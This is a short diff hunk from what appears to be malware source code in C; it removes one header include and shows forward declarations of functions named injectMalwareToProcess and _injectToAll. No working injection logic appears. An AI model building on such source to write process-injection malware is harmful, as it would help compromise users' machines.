@@ -11,7 +11,6 @@
 #include"str.h"
 #include"mem.h"
 #include"peimage.h"
-#include"WinAPITypes.h"
 
 static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags);
 bool _injectToAll(void);
